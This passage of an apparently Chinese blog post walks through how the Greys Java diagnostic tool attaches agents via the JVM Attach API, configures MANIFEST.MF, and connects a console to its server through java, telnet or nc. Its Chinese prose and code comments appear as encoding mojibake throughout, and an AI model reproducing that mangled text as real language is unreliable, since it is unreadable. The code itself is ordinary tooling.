class="line">    attachAgent(configure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é…ç½®æ–‡ä»¶å°±æ˜¯è„šæœ¬ä¸­æŒ‡å®šçš„å‚æ•°ï¼Œä¸»è¦æœ‰å¦‚ä¸‹å­—æ®µï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String targetIp;                <span class="comment">// ç›®æ ‡ä¸»æœºIP</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> targetPort;                 <span class="comment">// ç›®æ ‡è¿›ç¨‹å·</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> javaPid;                    <span class="comment">// å¯¹æ–¹javaè¿›ç¨‹å·</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> connectTimeout = <span class="number">6000</span>;      <span class="comment">// è¿æ¥è¶…æ—¶æ—¶é—´(ms)</span></span><br><span class="line"><span class="keyword">private</span> String greysCore;               <span class="comment">// greys-core.jarçš„ä½ç½®</span></span><br><span class="line"><span class="keyword">private</span> String greysAgent;              <span class="comment">// greys-agent.jarçš„ä½ç½®</span></span><br></pre></td></tr></table></figure>
<h3 id="attachåŸç†"><a href="#attachåŸç†" class="headerlink" title="attachåŸç†"></a>attachåŸç†</h3><img src="/2018/04/02/greys-start/attach.jpg" title="jpså®ç°åŸç†">
<p>æˆ‘ä»¬åœ¨ç”¨<code>jstack</code>å‘½ä»¤æŸ¥çœ‹jvmçš„çº¿ç¨‹dumpçš„æ—¶å€™ï¼Œç»å¸¸çœ‹åˆ°è¿™ä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªæ˜¯<code>&quot;Signal Dispatcher&quot;</code>, å¦å¤–ä¸€ä¸ªæ˜¯<code>&quot;Attach Listener&quot;</code>;<br>è¿™ä¸¤ä¸ªçº¿ç¨‹å°±å’ŒattachåŠŸèƒ½å¯†åˆ‡ç›¸å…³ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os_prio=0 tid=0x00007f23b80d2800 nid=0xb82e runnable [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line">&quot;Attach Listener&quot; #28 daemon prio=9 os_prio=0 tid=0x00007f2328001000 nid=0x3bb5 waiting on condition [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br></pre></td></tr></table></figure>
<p><code>Signal Dispatcher</code>è´Ÿè´£å“åº”<code>SIGQUIT</code>, å¹¶åˆ›å»º <code>Attach Listener</code>ã€‚<code>Attach Listener</code>è´Ÿè´£å»ºç«‹é€šä¿¡ï¼Œæ‰§è¡Œç›¸åº”çš„å‘½ä»¤ã€‚</p>
<p>attach jvmå°±æ˜¯æ ¹æ®<code>com.sun.tools.attach.VirtualMachine</code>çš„æ¥å£æä¾›çš„æ–¹æ³•â€”â€”<code>attach</code>å’Œ<code>loadAgent</code></p>
<h3 id="GreysLauncher"><a href="#GreysLauncher" class="headerlink" title="GreysLauncher"></a>GreysLauncher</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Object vmObj = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> == attachVmdObj) &#123; <span class="comment">// ä½¿ç”¨ attach(String pid) è¿™ç§æ–¹å¼</span></span><br><span class="line">              vmObj = vmClass.getMethod("attach", String.class).invoke(null, "" + configure.getJavaPid());</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              vmObj = vmClass.getMethod(<span class="string">"attach"</span>, vmdClass).invoke(<span class="keyword">null</span>, attachVmdObj);</span><br><span class="line">          &#125;</span><br><span class="line">          vmClass.getMethod("loadAgent", String.class, String.class).invoke(vmObj, configure.getGreysAgent(), configure.getGreysCore() + ";" + configure.toString());</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> != vmObj) &#123;</span><br><span class="line">              vmClass.getMethod(<span class="string">"detach"</span>, (Class&lt;?&gt;[]) <span class="keyword">null</span>).invoke(vmObj, (Object[]) <span class="keyword">null</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸Šé¢çš„ä»£ç ï¼Œ <code>greys-core.jar</code>å’Œ<code>greys-agent.jar</code>è¿™ä¸¤ä¸ªjaråŒ…å°±è¢«å¼•å…¥åˆ°äº†jvm</p>
<blockquote>
<p>The loadAgent method is used to load agents that are written in the Java Language and deployed in a JAR file. (See java.lang.instrument for a detailed description on how these agents are loaded and started).</p>
</blockquote>
<p><code>loadAgent</code>ä¼šå°†<code>greys-core.jar</code>å’Œ<code>greys-agent.jar</code>ä¸¤ä¸ªjaråŒ…å¼•å…¥è¿›æ¥ã€‚jaråŒ…å¼•å…¥åä¼šä»<code>/META-INF/MANIFEST.MF</code>ä¸­è¯»å–é…ç½®çš„agentç±»ã€‚</p>
<h2 id="agentå¯åŠ¨è¿‡ç¨‹"><a href="#agentå¯åŠ¨è¿‡ç¨‹" class="headerlink" title="agentå¯åŠ¨è¿‡ç¨‹"></a>agentå¯åŠ¨è¿‡ç¨‹</h2><p>agentæœ‰ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼Œä¸€ç§å†jvmå¯åŠ¨çš„æ—¶å€™ä¸€èµ·å¯åŠ¨ï¼Œ ä¸€ç§æ˜¯åŠ¨æ€çš„attachåˆ°ä¸€ä¸ªè¿è¡Œçš„jvmä¸Šã€‚</p>
<h3 id="éšå¯åŠ¨å‚æ•°å¯åŠ¨"><a href="#éšå¯åŠ¨å‚æ•°å¯åŠ¨" class="headerlink" title="éšå¯åŠ¨å‚æ•°å¯åŠ¨"></a>éšå¯åŠ¨å‚æ•°å¯åŠ¨</h3><p>ä»¥agentå½¢å¼å¯åŠ¨éœ€è¦åœ¨jvmå¯åŠ¨å‚æ•°æ·»åŠ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:btrace-agent.jar</span><br></pre></td></tr></table></figure>
<p>è¿™ç§åŠ è½½æ–¹å¼éœ€è¦å®ç°ä¸‹é¢ä¸¤ä¸ªæ¥å£ä¸­çš„ä¸€ä¸ªï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JVMå…ˆå°è¯•è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¦‚æœä¸Šé¢çš„æ–¹æ³•ä¸å­˜åœ¨ï¼Œåˆ™å°è¯•è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶å¿…é¡»åœ¨<code>MANIFEST.MF</code>ä¸­åŒ…å«<code>Premain-Class</code>æŒ‡å®šå¯¹åº”çš„ç±»ã€‚</p>
<h3 id="åŠ¨æ€attachçš„æ–¹å¼å¯åŠ¨"><a href="#åŠ¨æ€attachçš„æ–¹å¼å¯åŠ¨" class="headerlink" title="åŠ¨æ€attachçš„æ–¹å¼å¯åŠ¨"></a>åŠ¨æ€attachçš„æ–¹å¼å¯åŠ¨</h3><p>attachå½¢å¼éœ€è¦å®ç°ä¸‹é¢çš„ä¸¤ä¸ªæ¥å£</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é¦–å…ˆå°è¯•è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸Šé¢çš„æ–¹æ³•ä¸å­˜åœ¨ï¼Œä¼šå°è¯•è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶åœ¨JaråŒ…ä¸­å¿…é¡»æŒ‡å®š <code>Agent-Class</code>, å› æ­¤å½“æ­¤jaråŒ…è¢«åŠ è½½æ—¶ï¼Œjvmä¼šä»<code>/META-INF/MANIFEST.MF</code>ä¸­è¯»å–é…ç½®çš„<code>Premain-Class</code>å’Œ<code>Agent-Class</code>, <code>greys-agent</code>çš„ä¿¡æ¯æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Agent-Class: com.github.ompc.greys.agent.AgentLauncher</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.github.ompc.greys.agent.AgentLauncher</span><br></pre></td></tr></table></figure>
<p>å› æ­¤å…¥å£å®šä½åœ¨<code>AgentLauncher</code>ã€‚</p>
<h3 id="AgentLauncher"><a href="#AgentLauncher" class="headerlink" title="AgentLauncher"></a>AgentLauncher</h3><p><code>AgentLauncher</code>çš„ä¸»è¦å®Œæˆäº†ä¸€ä¸‹çš„åŠŸèƒ½ï¼š</p>
<pre><code>- è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œå‡å°‘å¯¹ç°æœ‰å·¥ç¨‹çš„ä¾µèš€
- å¯åŠ¨ä¸€ä¸ª`GaServer`ç›‘å¬æŒ‡å®šçš„ç«¯å£
</code></pre><p><code>GaServer</code>è¯»å–ç”¨æˆ·çš„è¾“å…¥çš„å‘½ä»¤ï¼Œ å°†å‘½ä»¤äº¤ç»™<code>CommandHandler</code>åœ¨æ–°çš„çº¿ç¨‹ä¸­è¿›è¡Œå…·ä½“çš„å¤„ç†ã€‚</p>
<h1 id="active-consoleåˆ†æ"><a href="#active-consoleåˆ†æ" class="headerlink" title="active consoleåˆ†æ"></a>active consoleåˆ†æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># active console</span></span><br><span class="line"><span class="comment"># $1 : greys_local_version</span></span><br><span class="line">active_console()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use default console</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            -cp <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar \</span><br><span class="line">            com.github.ompc.greys.core.GreysConsole \</span><br><span class="line">                <span class="variable">$&#123;TARGET_IP&#125;</span> \</span><br><span class="line">                <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> telnet 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use telnet</span></span><br><span class="line">        telnet <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> nc 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use netcat</span></span><br><span class="line">        nc <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"'telnet' or 'nc' is required."</span> 1&gt;&amp;2</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>active console</code>ä¸»è¦æ˜¯å¯åŠ¨ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œ å®ƒå¯¹ä¸åŒçš„æ–¹å¼åšäº†åˆ¤æ–­; ä»¥javaæ–¹å¼å¯åŠ¨çš„ä¼šæ‰§è¡Œ<code>greys-core.jar</code>çš„<code>GreysConsole</code><br>çš„mainæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String... args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> GreysConsole(<span class="keyword">new</span> InetSocketAddress(args[<span class="number">0</span>], Integer.valueOf(args[<span class="number">1</span>])));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>GreysConsole</code>çš„æ„é€ å‡½æ•°ä¸­è¿æ¥åˆ°ä¸Šé¢å¯åŠ¨çš„<code>GaServer</code>ï¼Œ å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å‘é€åˆ°serverç«¯ï¼Œ ç„¶åå°†serverç«¯çš„è¿”å›æ˜¾ç¤ºåœ¨äº¤äº’å¼shellä¸Šã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#activeConsoleReader</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘é€å‘½ä»¤åˆ°æœåŠ¡ç«¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">activeConsoleReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread socketThread = <span class="keyword">new</span> Thread(<span class="string">"ga-console-reader-daemon"</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> StringBuilder lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String line = console.readLine();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// å¦‚æœæ˜¯\ç»“å°¾ï¼Œåˆ™è¯´æ˜è¿˜æœ‰ä¸‹æ–‡ï¼Œéœ€è¦å¯¹æ¢è¡Œåšç‰¹æ®Šå¤„ç†</span></span><br><span class="line">                    <span class="keyword">if</span> (StringUtils.endsWith(line, <span class="string">"\\"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// å»æ‰ç»“å°¾çš„\</span></span><br><span class="line">                        lineBuffer.append(line.substring(<span class="number">0</span>, line.length() - <span class="number">1</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        lineBuffer.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String lineForWrite = lineBuffer.toString();</span><br><span class="line">                    lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// replace ! to \!</span></span><br><span class="line">                    <span class="comment">// history.add(StringUtils.replace(lineForWrite, "!", "\\!"));</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// flush if need</span></span><br><span class="line">                    <span class="keyword">if</span> (history <span class="keyword">instanceof</span> Flushable) &#123;</span><br><span class="line">                        ((Flushable) history).flush();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    console.setPrompt(EMPTY);</span><br><span class="line">                    <span class="keyword">if</span> (isNotBlank(lineForWrite)) &#123;</span><br><span class="line">                        socketWriter.write(lineForWrite + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        socketWriter.write(<span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    socketWriter.flush();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                err(<span class="string">"read fail : %s"</span>, e.getMessage());</span><br><span class="line">                shutdown();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    socketThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    socketThread.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#loopForWriter</span></span><br><span class="line"><span class="comment">// å°†æœåŠ¡ç«¯è¿”å›è¾“å‡ºåˆ°ç•Œé¢</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loopForWriter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> c = socketReader.read();</span><br><span class="line">            <span class="keyword">if</span> (c == EOF) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c == EOT) &#123;</span><br><span class="line">                hackingForReDrawPrompt();</span><br><span class="line">                console.setPrompt(DEFAULT_PROMPT);</span><br><span class="line">                console.redrawLine();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.write(c);</span><br><span class="line">            &#125;</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        err(<span class="string">"write fail : %s"</span>, e.getMessage());</span><br><span class="line">        shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ä½¿ç”¨mavenç”ŸæˆMainFestæ–‡ä»¶"><a href="#ä½¿ç”¨mavenç”ŸæˆMainFestæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨mavenç”ŸæˆMainFestæ–‡ä»¶"></a>ä½¿ç”¨mavenç”ŸæˆMainFestæ–‡ä»¶</h2><h3 id="maven-jar-plugin"><a href="#maven-jar-plugin" class="headerlink" title="maven-jar-plugin"></a>maven-jar-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>qtracer-agent<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="maven-assembly-plugin"><a href="#maven-assembly-plugin" class="headerlink" title="maven-assembly-plugin"></a>maven-assembly-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>**.**.InstrumentTest<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>**.**..InstrumentTest<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul>
<li><a href="https://unix.stackexchange.com/questions/15740/how-to-specify-option-with-gnu-getopt" rel="external nofollow noopener noreferrer" target="_blank">bash - How to specify -? option with GNU getopt - Unix &amp; Linux Stack Exchange</a></li>
<li><a href="https://linux.die.net/man/3/getopt" rel="external nofollow noopener noreferrer" target="_blank">getopt(3): Parse options - Linux man page</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/jdk/api/attach/spec/com/sun/tools/attach/VirtualMachine.html" rel="external nofollow noopener noreferrer" target="_blank">VirtualMachine (Attach API )</a></li>
